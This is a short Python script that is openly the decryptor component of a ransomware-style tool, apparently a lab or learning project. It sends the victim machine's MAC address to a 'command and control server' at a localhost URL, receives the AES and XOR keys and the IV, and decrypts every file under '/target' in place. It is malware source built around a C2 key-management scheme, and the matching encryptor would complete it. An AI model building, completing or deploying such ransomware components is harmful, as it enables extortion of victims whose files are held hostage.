#!/usr/bin/python3
import requests
import binascii
import base64
import getmac
import urllib
import os
from colored import fg, attr
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

class Decryptor:
	def decrypt(self, file):
		print("{}[+] decrypting -> {}{}".format(fg(10), file, attr(0)))
		fd = open(file, "rb")
		ct = fd.read()
		fd.close()

		# AES Decryption
		cipher = AES.new(self.enc_key, AES.MODE_CBC, self.iv)
		xored_data = unpad(cipher.decrypt(ct), AES.block_size)

		# XOR Decryption
		plaintext = b""
		i = 0
		while i < len(xored_data):
			plaintext += chr(xored_data[i] ^ self.xor_key[i % len(self.xor_key)]).encode()
			i += 1

		pt_data = open(file, "wb")
		pt_data.write(binascii.unhexlify(plaintext))


	def get_keys(self):
		print(
			f"{fg(11)}[*] Command and control server data retrieving...{attr(0)}")

		cmdControlServer = "http://127.0.0.1:1337/get_keys"
		targetMAC = urllib.parse.quote(base64.b64encode(getmac.get_mac_address().encode()))
		params = {"mac_address": targetMAC}
		response = requests.get(cmdControlServer, params = params)
		self.enc_key, self.xor_key, self.iv = response.text.split("|")

		# base64 decode the encryption keys
		self.enc_key = self.decode_keys(self.enc_key)
		self.xor_key = self.decode_keys(self.xor_key)
		self.iv = self.decode_keys(self.iv)


	def dir_to_decrypt(self, dir_name):
		self.get_keys()
		# what directory to encrypt
		print(f"{fg(11)}[*] decrypting '{dir_name}' directory{attr(0)}")
		for root, subdirs, files in os.walk(dir_name):
			for file in files:
				self.decrypt("{}/{}".format(root, file))

	def decode_keys(self, key):
		return base64.b64decode(key)


decryptor = Decryptor()
decryptor.dir_to_decrypt("/target")
